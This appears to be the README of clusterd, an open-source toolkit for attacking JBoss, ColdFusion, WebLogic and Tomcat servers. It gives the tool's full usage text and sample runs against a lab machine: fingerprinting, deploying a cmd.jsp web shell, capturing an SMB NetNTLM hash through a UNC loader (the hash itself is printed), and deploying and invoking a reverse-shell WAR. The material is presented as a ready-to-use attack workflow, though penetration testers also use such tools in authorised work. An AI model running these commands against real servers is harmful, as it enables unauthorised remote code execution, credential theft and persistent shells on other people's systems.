clusterd
==

clusterd is an open source application server attack toolkit.  Born out of frustration with
current fingerprinting and exploitation methods, clusterd automates the fingerprinting,
reconnaissance, and exploitation phases of an application server attack.  See the wiki for more information. 

Requirements
----
* Python >= 2.7.x
* Requests >= 2.2.x

Installation
----
The recommended installation of clusterd is to clone the Github repository

    git clone https://github.com/hatRiot/clusterd.git

clusterd features
----
* JBoss
    - Versions 3.x - 8.0 
    - Currently supported deployers:
        + /jmx-console/MainDeployer for 3.x, 4.x, and 6.x
        + /jmx-console/DeploymentFileRepository for 3.x, 4.x, and 5.x
        + /web-console/Invoker (MainDeployer) for 3.x, 4.x, and 6.x
        + /web-console/Invoker (BSHDeployer) for 3.x and 4.x
        + /invoker/JMXInvokerServlet for 3.x, 4.x, and 5.x
        + /invoker/EJBInvokerServlet for 3.x, 4.x, and 5.x
        + /management for 7.x, 8.x
    - Dump deployed WARs 
    - Fetch host OS information
    - Verb tampering vulnerability (CVE-2010-0738)
    - Credential/path disclosure (CVE-2005-2006)

* ColdFusion
    - Versions 6 - 10
    - Currently supported deployers:
        + Task Scheduler for 9.x and 10.x
    - Hash retrieval for versions 6 - 10
    - RDS admin bypass (CVE-2013-0632)

* WebLogic
    - Versions 7, 8.1, 11, and 12
    - Deployer over T3 and T3S currently tested against 11.x and 12.x
    - Dump deployed WARs over T3/T3S
    - Fetch host OS information

* Tomcat fingerprinting
    - Versions 3.x - 8.x
    - Currently can deploy to all versions with an exposed manager interface
    - Dump deployed WARs
    - Fetch host OS information

* Simple API for adding new platforms, fingerprints, deployers, and exploits
* Various auxiliary modules for vulnerabilities and exploitation techniques

examples / usage
----
```
bryan@debdev:~/tools/clusterd$ ./clusterd.py 

        clusterd/0.1 - clustered attack toolkit
          Supporting jboss, coldfusion, weblogic, tomcat

usage: ./clusterd.py [options]

optional arguments:
  -h, --help            show this help message and exit

Connection:
  Options for configuring the connection

  -i [ip address]       Server address
  -iL [file]            Server list
  -p [port]             Server port
  --proxy [proxy://server:port]
                        Connect through proxy [http|https]
  --proxy-auth [username:password]
                        Proxy credentials
  --timeout [seconds]   Connection timeout [5s]
  --random-agent        Use a random User-Agent for requests
  --ssl                 Force SSL

Remote Host:
  Settings specific to the remote host

  -a [jboss|coldfusion|weblogic|tomcat]
                        Hint at remote host service
  -o [windows|linux]    Hint at remote host OS
  -v [version]          Specific version to test
  --usr-auth [username:password]
                        Login credentials for service
  --fingerprint         Fingerprint the remote system
  --arch [x86|x64]      Specify remote OS architecture

Deploy:
  Deployment flags and settings

  --deploy [file]       Deploy to the discovered service
  --deployer [deployer]
                        Specify a deployer to use
  --invoke              Invoke payload after deployment
  -b [user]             Brute force credentials for user [admin]
  --wordlist [path]     Wordlist for brute forcing passwords

jboss modules:
  --jb-info             Dump host information
  --jb-list             List deployed WARs
  --jb-smb              Obtain SMB hash

coldfusion modules:
  --cf-info             Dump host information

weblogic modules:
  --wl-info             Gather WebLogic info
  --wl-list             List deployed apps
  --wl-smb              Obtain SMB hash

tomcat modules:
  --tc-info             Gather Tomcat info
  --tc-list             List deployed WARs
  --tc-smb              Obtain SMB hash

Other:
  Miscellaneous flags

  --deploy-list         List all available deployers
  --aux-list            List all available exploits
  --gen-payload [host:port] for reverse connection
                        Generate a reverse shell payload
  -d                    Enable debug output
  -l                    Log output to file [$time$_log.log]
```

jboss fingerprint and host info
```
bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a jboss --jb-info --random-agent

        clusterd/0.1 - clustered attack toolkit
          Supporting jboss, coldfusion, weblogic, tomcat

 [2014-01-25 06:51PM] Started at 2014-01-25 06:51PM
 [2014-01-25 06:51PM] Servers' OS hinted at windows
 [2014-01-25 06:51PM] Fingerprinting host '192.168.1.102'
 [2014-01-25 06:51PM] Server hinted at 'jboss'
 [2014-01-25 06:51PM] Checking jboss version 3.2 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 3.2 JBoss Web Console...
 [2014-01-25 06:51PM] Checking jboss version 3.0 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 4.2 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 4.2 JBoss Web Console...
 [2014-01-25 06:51PM] Checking jboss version 4.0 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 4.0 JBoss Web Console...
 [2014-01-25 06:51PM] Checking jboss version 5.1 JBoss Web Manager...
 [2014-01-25 06:51PM] Checking jboss version 5.1 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 5.1 JBoss Web Console...
 [2014-01-25 06:51PM] Checking jboss version 5.0 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 5.0 JBoss Web Console...
 [2014-01-25 06:51PM] Checking jboss version 6.0 JBoss Web Manager...
 [2014-01-25 06:51PM] Checking jboss version 6.1 JBoss Web Manager...
 [2014-01-25 06:51PM] Checking jboss version 6.1 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 6.0 JBoss JMX Console...
 [2014-01-25 06:51PM] Checking jboss version 7.1 JBoss Management...
 [2014-01-25 06:51PM] Checking jboss version 7.0 JBoss Management...
 [2014-01-25 06:51PM] Checking jboss version Any JBoss JMX Invoker Servlet...
 [2014-01-25 06:51PM] Checking jboss version Any JBoss RMI Interface...
 [2014-01-25 06:51PM] Checking jboss version Any JBoss Status Page...
 [2014-01-25 06:51PM] Matched 5 fingerprints for service jboss
 [2014-01-25 06:51PM]   JBoss JMX Console (version 5.0)
 [2014-01-25 06:51PM]   JBoss Web Console (version 5.0)
 [2014-01-25 06:51PM]   JBoss JMX Invoker Servlet (version Any)
 [2014-01-25 06:51PM]   JBoss RMI Interface (version Any)
 [2014-01-25 06:51PM]   JBoss Status Page (version Any)
 [2014-01-25 06:51PM] Fingerprinting completed.
 [2014-01-25 06:51PM] Attempting to retrieve JBoss info...
 [2014-01-25 06:51PM]   ActiveThreadCount: 71    
 [2014-01-25 06:51PM]   OSArch: amd64    
 [2014-01-25 06:51PM]   AvailableProcessors: 1    
 [2014-01-25 06:51PM]   MaxMemory: 518979584    
 [2014-01-25 06:51PM]   HostAddress: 192.168.1.102    
 [2014-01-25 06:51PM]   JavaVersion: 1.7.0_45    
 [2014-01-25 06:51PM]   OSVersion: 6.1    
 [2014-01-25 06:51PM]   TotalMemory: 282968064    
 [2014-01-25 06:51PM]   JavaVendor: Oracle Corporation    
 [2014-01-25 06:51PM]   ActiveThreadGroupCount: 9    
 [2014-01-25 06:51PM]   FreeMemory: 152545376    
 [2014-01-25 06:51PM]   OSName: Windows 7    
 [2014-01-25 06:51PM]   HostName: bryan-PC    
 [2014-01-25 06:51PM]   JavaVMVersion: 24.45-b08    
 [2014-01-25 06:51PM]   JavaVMVendor: Oracle Corporation    
 [2014-01-25 06:51PM]   JavaVMName: Java HotSpot(TM) 64-Bit Server VM    
 [2014-01-25 06:51PM] Finished at 2014-01-25 06:51PM
```

jboss DFS deployment against JBoss 5.0
```
bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a jboss -v 5 --deploy ./src/lib/cmd.war --random-agent

        clusterd/0.1 - clustered attack toolkit
          Supporting jboss, coldfusion, weblogic, tomcat

 [2014-01-25 06:54PM] Started at 2014-01-25 06:54PM
 [2014-01-25 06:54PM] Servers' OS hinted at windows
 [2014-01-25 06:54PM] Fingerprinting host '192.168.1.102'
 [2014-01-25 06:54PM] Server hinted at 'jboss'
 [2014-01-25 06:54PM] Checking jboss version 5.1 JBoss Web Manager...
 [2014-01-25 06:54PM] Checking jboss version 5.1 JBoss JMX Console...
 [2014-01-25 06:54PM] Checking jboss version 5.1 JBoss Web Console...
 [2014-01-25 06:54PM] Checking jboss version 5.0 JBoss JMX Console...
 [2014-01-25 06:54PM] Checking jboss version 5.0 JBoss Web Console...
 [2014-01-25 06:54PM] Checking jboss version Any JBoss JMX Invoker Servlet...
 [2014-01-25 06:54PM] Checking jboss version Any JBoss RMI Interface...
 [2014-01-25 06:54PM] Checking jboss version Any JBoss Status Page...
 [2014-01-25 06:54PM] Matched 5 fingerprints for service jboss
 [2014-01-25 06:54PM]   JBoss JMX Console (version 5.0)
 [2014-01-25 06:54PM]   JBoss Web Console (version 5.0)
 [2014-01-25 06:54PM]   JBoss JMX Invoker Servlet (version Any)
 [2014-01-25 06:54PM]   JBoss RMI Interface (version Any)
 [2014-01-25 06:54PM]   JBoss Status Page (version Any)
 [2014-01-25 06:54PM] Fingerprinting completed.
 [2014-01-25 06:54PM] This deployer requires a JSP, default to cmd.jsp? [Y/n] > 
 [2014-01-25 06:55PM] Preparing to deploy /home/bryan/tools/clusterd/src/lib/cmd.jsp...
 [2014-01-25 06:55PM] Successfully deployed /home/bryan/tools/clusterd/src/lib/cmd.jsp
 [2014-01-25 06:55PM] Finished at 2014-01-25 06:55PM
```

jboss UNC hash retrieval
```
bryan@debdev:~/tools/clusterd$ sudo ./clusterd.py -i 192.168.1.102 -a jboss -v4.2 --random-agent --jb-smb

        clusterd/0.1 - clustered attack toolkit
          Supporting jboss, coldfusion, weblogic, tomcat

 [2014-02-08 12:24AM] Started at 2014-02-08 12:24AM
 [2014-02-08 12:24AM] Servers' OS hinted at windows
 [2014-02-08 12:24AM] Fingerprinting host '192.168.1.102'
 [2014-02-08 12:24AM] Server hinted at 'jboss'
 [2014-02-08 12:24AM] Checking jboss version 4.2 JBoss JMX Console...
 [2014-02-08 12:24AM] Checking jboss version 4.2 JBoss Web Console...
 [2014-02-08 12:24AM] Checking jboss version Any JBoss JMX Invoker Servlet...
 [2014-02-08 12:24AM] Checking jboss version Any JBoss RMI Interface...
 [2014-02-08 12:24AM] Checking jboss version Any JBoss Status Page...
 [2014-02-08 12:24AM] Matched 5 fingerprints for service jboss
 [2014-02-08 12:24AM]   JBoss JMX Console (version 4.2)
 [2014-02-08 12:24AM]   JBoss Web Console (version 4.2)
 [2014-02-08 12:24AM]   JBoss JMX Invoker Servlet (version Any)
 [2014-02-08 12:24AM]   JBoss RMI Interface (version Any)
 [2014-02-08 12:24AM]   JBoss Status Page (version Any)
 [2014-02-08 12:24AM] Fingerprinting completed.
 [2014-02-08 12:24AM] Setting up SMB listener..
 [2014-02-08 12:24AM] Invoking UNC loader...
 [2014-02-08 12:24AM] bryan::bryan-PC:1122334455667788:d24a1c43f9d219aa8a38d018ec7e9b89:01010000000000005a4d8bca9e24cf01ad86b744515b143100000000020000000000000000000000
 [2014-02-08 12:24AM] Finished at 2014-02-08 12:24AM
```

tomcat deployment and reverse shell invocation
```
bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a tomcat --deploy shell.war --invoke

        clusterd/0.1 - clustered attack toolkit
          Supporting jboss, coldfusion, weblogic, tomcat

 [2014-02-08 12:50AM] Started at 2014-02-08 12:50AM
 [2014-02-08 12:50AM] Servers' OS hinted at windows
 [2014-02-08 12:50AM] Fingerprinting host '192.168.1.102'
 [2014-02-08 12:50AM] Server hinted at 'tomcat'
 [2014-02-08 12:50AM] Checking tomcat version 3.3 Tomcat...
 [2014-02-08 12:50AM] Checking tomcat version 3.3 Tomcat Admin...
 [2014-02-08 12:50AM] Checking tomcat version 4.0 Tomcat...
 [2014-02-08 12:50AM] Checking tomcat version 4.1 Tomcat...
 [2014-02-08 12:50AM] Checking tomcat version 4.1 Tomcat Manager...
 [2014-02-08 12:50AM] Checking tomcat version 4.0 Tomcat Manager...
 [2014-02-08 12:50AM] Checking tomcat version 5.5 Tomcat...
 [2014-02-08 12:50AM] Checking tomcat version 5.5 Tomcat Manager...
 [2014-02-08 12:50AM] Checking tomcat version 6.0 Tomcat...
 [2014-02-08 12:50AM] Checking tomcat version 6.0 Tomcat Manager...
 [2014-02-08 12:50AM] Checking tomcat version 7.0 Tomcat...
 [2014-02-08 12:50AM] Checking tomcat version 7.0 Tomcat Manager...
 [2014-02-08 12:50AM] Checking tomcat version 8.0 Tomcat...
 [2014-02-08 12:50AM] Checking tomcat version 8.0 Tomcat Manager...
 [2014-02-08 12:50AM] Matched 2 fingerprints for service tomcat
 [2014-02-08 12:50AM]   Tomcat (version 5.5)
 [2014-02-08 12:50AM]   Tomcat Manager (version 5.5)
 [2014-02-08 12:50AM] Fingerprinting completed.
 [2014-02-08 12:50AM] Preparing to deploy shell.war...
 [2014-02-08 12:50AM] Deployed shell.war to /shell
 [2014-02-08 12:50AM] shell.war invoked at 192.168.1.102
 [2014-02-08 12:50AM] Finished at 2014-02-08 12:50AM
```
